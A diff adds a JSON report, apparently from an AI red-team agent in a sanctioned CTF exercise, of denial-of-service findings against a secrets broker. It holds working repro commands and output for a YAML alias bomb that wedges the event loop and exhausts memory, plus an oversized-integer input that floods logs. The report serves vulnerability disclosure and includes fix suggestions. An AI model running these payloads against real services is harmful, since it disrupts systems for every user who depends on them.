@@ -1,0 +1,63 @@
+{
+  "agent_id": "w1-preset",
+  "surface": "F4 preset-and-import + F5 config-parsing",
+  "candidates": [
+    {
+      "id": "w1-preset-1",
+      "title": "Tiny YAML alias bomb wedges the broker's single event loop and exhausts memory via repr() of attacker-controlled values in parse_preset error messages (op_preset_validate / op_preset_propose, NO approval needed)",
+      "win_condition": "DoS / INTEGRITY",
+      "repro_cmds": [
+        "# Build a 346-BYTE presets YAML. safe_load keeps the aliased lists as SHARED references (fast), but config.py interpolates the value with {!r} into a validation error; repr() does NOT share references, so it materialises the full w**d expansion.",
+        "sudo -u redteam /opt/ctf/venv/bin/python -c \"\\ndef inner(i,w=8):\\n    return '&L0 \\\"x\\\"' if i==0 else f'&L{i} ['+inner(i-1,w)+(f',*L{i-1}')*(w-1)+']'\\nopen('/tmp/bomb.yaml','w').write('presets:\\n  p:\\n    max_session: '+inner(8)+'\\n    env:\\n      X: CAPTURE_THE_FLAG\\n')\"",
+        "wc -c /tmp/bomb.yaml   # 346 bytes",
+        "# Send it through the official client as the listed user. preset validate parses INLINE on the broker's single asyncio loop and needs no console approval.",
+        "time /opt/ctf/envh-rt preset validate /tmp/bomb.yaml | wc -c   # ~57s wall, 88,679,629-byte error reply for a 346-byte input",
+        "# Concurrency proof that the single event loop is BLOCKED for all other clients (incl. the approval console) during the parse, with recovery:",
+        "sudo -u redteam /opt/ctf/venv/bin/python -u /tmp/w1_wedge_live.py   # d=8,w=8 recoverable size",
+        "# Scaling (shown locally, NOT run against the live broker to avoid an OOM-kill per CHARTER 3.5): 495-byte file (d=10,w=10) -> >1GB RSS and >8s just for the repr; larger depths are effectively unbounded / OOM."
+      ],
+      "observed_output": "baseline: op_list latency=0.001s ok=True\\nconn B op_list latency DURING bomb = 1.141s ok=True   (<-- 1000x block of an unrelated client while the broker builds the repr)\\npost-wedge: op_list latency=0.001s ok=True   secrets still present: ['CAPTURE_THE_FLAG','DATABASE_URL','GITHUB_TOKEN','OPENAI_API_KEY']\\n---\\n/opt/ctf/envh-rt preset validate /tmp/bomb.yaml  -> exit=5  wall=57.06s  reply_bytes=88679629\\nfirst bytes: \\\"envh: preset 'p': max_session must be a string like 2h, got [[[[[[[['x', 'x', 'x', 'x', 'x', 'x', 'x', 'x'], ['x', ...\\\"\\n---\\nlocal parse_presets timing (real broker code path): d=8 w=8 (346B)=1.33s msglen=88,679,622 ; d=10 w=10 (495B)=>8s peakRSS=1034MB ; safe_load alone on same inputs = 0.001-0.006s (shared refs, not the problem).",
+      "flag_or_value_obtained": null,
+      "in_scope": true,
+      "why_novel": "Not in README/SECURITY. Those docs list DoS/network/root/X11 only as the OUT-OF-SCOPE (unprotected) areas for the HUMAN/root surface; a socket-triggered event-loop wedge + memory exhaustion by a LISTED user (the exact malicious-agent threat model) is explicitly IN scope per CHARTER 4 ('wedging its event loop, exhausting it'). The design correctly gates every write/leak behind approve(), but the synchronous YAML parse + validation runs on the single asyncio loop with no complexity/size budget, and parse_preset interpolates attacker YAML nodes with {!r} (config.py lines 146 max_session, 140 per-var approval, 321 secret), so a <0.5KB document explodes into a multi-GB string that no approval is required to trigger (op_preset_validate never creates a pending request).",
+      "severity": "HIGH",
+      "self_assessment": "CONFIRMED",
+      "notes": "Root cause: YAML aliases make a tiny doc a small SHARED object graph; repr() (used to build the '... got {value!r}' validation error) walks it without sharing => O(width**depth). Reachable sinks from the socket, all in preset YAML: max_session value, a preset-var 'approval' value, and a 'secret' value that is a non-string. Same parse path is hit by op_preset_propose too (it calls validate_preset_yaml before announcing), so propose is equally vulnerable; op_preset_validate is the cleanest because it needs no reason and creates no request. op_import's presets come from JSON (no aliases) so it is not bombable this way. Amplification bonus: after the repr, the broker also json.dumps() and transmits the ~88MB error back to the client. I deliberately demonstrated only recoverable sizes against the live broker (CHARTER 3.5 forbids killing it); the broker was alive and the vault intact after every test. Fix ideas: cap input complexity, parse with yaml.compose + node-count limit, or never repr() parsed values (use type name / truncated str) in error messages."
+    },
+    {
+      "id": "w1-preset-2",
+      "title": "Over-long numeric duration in a preset raises an uncaught ValueError (Python int-string >4300-digit limit), surfaced to the client as a generic 'internal error' and logged as a broker traceback instead of a clean validation error",
+      "win_condition": "DoS / INTEGRITY",
+      "repro_cmds": [
+        "BIG=$(sudo -u redteam /opt/ctf/venv/bin/python -c \"print('9'*6000)\")",
+        "sudo -u redteam /opt/ctf/venv/bin/python /tmp/w1_rt.py \"{\\\"op\\\":\\\"preset_validate\\\",\\\"yaml\\\":\\\"presets:\\\\n  p:\\\\n    max_session: '${BIG}h'\\\\n    env:\\\\n      X: CAPTURE_THE_FLAG\\\\n\\\"}\" 1 5",
+        "# compare with a normal bad duration which is handled cleanly:",
+        "sudo -u redteam /opt/ctf/venv/bin/python /tmp/w1_rt.py '{\"op\":\"preset_validate\",\"yaml\":\"presets:\\n  p:\\n    max_session: 99zz\\n    env:\\n      X: CAPTURE_THE_FLAG\\n\"}' 1 5"
+      ],
+      "observed_output": "big-digit:  {\"ok\": false, \"error\": \"internal error in the broker; see its console\"}\\nnormal bad: {\"ok\": false, \"error\": \"preset 'p': invalid duration '99zz': use a whole number followed by s, m or h, like 30m\"}\\nbroker still alive afterwards (op_list ok).",
+      "flag_or_value_obtained": null,
+      "in_scope": true,
+      "why_novel": "Not acknowledged. durations.parse_duration matches ^(\\d+)([smh])$ then calls int(match.group(1)); for >4300 digits CPython raises ValueError (not DurationError), which _parse_session_duration does not catch, so it escapes parse_presets. op_preset_validate only catches ConfigError, so control.py's top-level 'except Exception' turns an ordinary malformed input into a generic 'internal error' reply AND writes a full traceback to the broker audit/console every time.",
+      "severity": "LOW",
+      "self_assessment": "CONFIRMED",
+      "notes": "Hardening/robustness bug only: the broker survives, no secret leak, no state change. Impact is cosmetic (wrong error) plus unbounded console/audit traceback spam a listed user can generate at will (a mild log-flood primitive). A grader may reasonably rate this LOW or REJECT for limited impact; recorded for completeness and because it is squarely in the F5 duration-parsing lane. Fix: wrap int() / catch ValueError as a DurationError, or bound the digit count in the regex."
+    }
+  ],
+  "negative_results": [
+    "NO change before decision: snapshotted `envh list` (secrets+presets), fired op_preset_propose (mapping LEAK->CAPTURE_THE_FLAG) and op_import (new secret + preset mapping to the flag) each blocking then disconnecting, re-snapshotted -> byte-identical (DIFF empty). All disk writes (write_presets / vault.set / vault.save) are gated inside broker.approve(); no socket op (validate/propose/import) writes presets.yaml/config.yaml/vault before a console decision. With no approver the ops just block and withdraw on disconnect.",
+    "NO value/fingerprint leak to the socket client: op_preset_validate returns only sorted preset NAMES {\"presets\":[...]}. op_preset_propose's pre-decision reply is {ok,request_id,pending,notify,presets:[names]}; op_import's is {ok,request_id,pending,notify}. The diff, fingerprints, merged presets and import resolution (added/reused/renamed) live only in request.summary (shown to the CONSOLE via _show) and in request.result, which op_import sets ONLY on approval and _reply_decision sends ONLY after a decision. With no approver the client never receives any of it.",
+    "import value-confirmation oracle is NOT exposed: import_resolution() does read every stored value to build stored_by_value and would classify a submitted value matching CAPTURE_THE_FLAG as 'reused' under its stored name, but that resolution is never returned to the client before approval (verified: op_import first reply carries no resolution). So no value/equality oracle over the socket.",
+    "preset_validate secret-name oracle is redundant: a preset referencing a non-vault secret errors 'secret X is not in the vault', but op_list already returns every vault secret NAME to the listed user, so this reveals nothing new (the flag's NAME is already known; only its VALUE matters).",
+    "yaml.safe_load itself is NOT the exponential step: on the same alias-bomb inputs it returns in 1-6ms because PyYAML keeps aliases as shared references (id(top[0])==id(top[1])). The blow-up is purely in downstream repr()/string building, not the parser.",
+    "Deep nested flow YAML ([[[...]]] x20000) raises RecursionError quickly (~0.3-0.7s) and is caught by control.py's 'except Exception' -> clean 'internal error'; does not crash the broker.",
+    "Recursive self-alias (presets: &p { ... X: *p }) is handled: safe_load builds a self-referential dict instantly; parse_presets rejects it fast with a ConfigError (unknown field); no hang.",
+    "No ReDoS: SECRET_NAME, VAR_NAME, PRESET_NAME, PLAIN_SCALAR, the duration regex and common.printable's _UNSAFE_CHARACTERS are all anchored single-character-class patterns; 1MB inputs match in ~1-3ms.",
+    "A ~660KB presets doc with 15000 presets parses in ~1.6s (bounded by MAX_LINE=1MB, so ~2-3s max of pure parse per request) -- a much milder synchronous-parse block than candidate 1; noted as the same family (no complexity budget on the event loop) but far weaker than the alias-repr bomb.",
+    "outsider (unlisted uid) is rejected by serve() before any op runs ('uid ... is not in the broker's users list'); the DoS requires a LISTED user, which is the intended agent/dependency threat model."
+  ],
+  "out_of_scope_observations": [
+    "Per CHARTER 3.5 I did not run the OOM-scale alias bomb (d>=10) against the live broker, to avoid killing/corrupting it. The >1GB growth was measured locally against the identical core/config.py parse path as redteam.",
+    "The `reason` string on preset/import/session requests is passed to the console display; whether it is run through common.printable before rendering is a CONSOLE-rendering question (request_card.py / summaries.py) and belongs to the console/info-leak surface, not F4/F5 -- not investigated here.",
+    "INCIDENTAL (F9 lane, not mine, broker recovered): /opt/ctf/broker.log shows repeated 'OSError: [Errno 24] Too many open files' in asyncio _accept_connection -> the broker's listening socket hit the 1024 soft FD limit (RLIMIT_NOFILE soft=1024, hard=20000) at some point during the wave. control.py's serve() awaits reader.readline() with NO idle timeout and there is no per-connection cap (MAX_PENDING_PER_USER caps only new_request, not open sockets), so ~1024 idle connections that send nothing would exhaust FDs and make accept() fail for every client AND the approval console. The asyncio accept loop logged and survived (broker FD count back to 7, answers ok), so it was not killed. This was likely a concurrent F9 dos-resilience agent or test harness churn, not my parse-path work; flagged here so the F9 owner/grader can pursue a clean deliberate repro. I did not hammer it further, to avoid disrupting the shared broker."
+  ]
+}
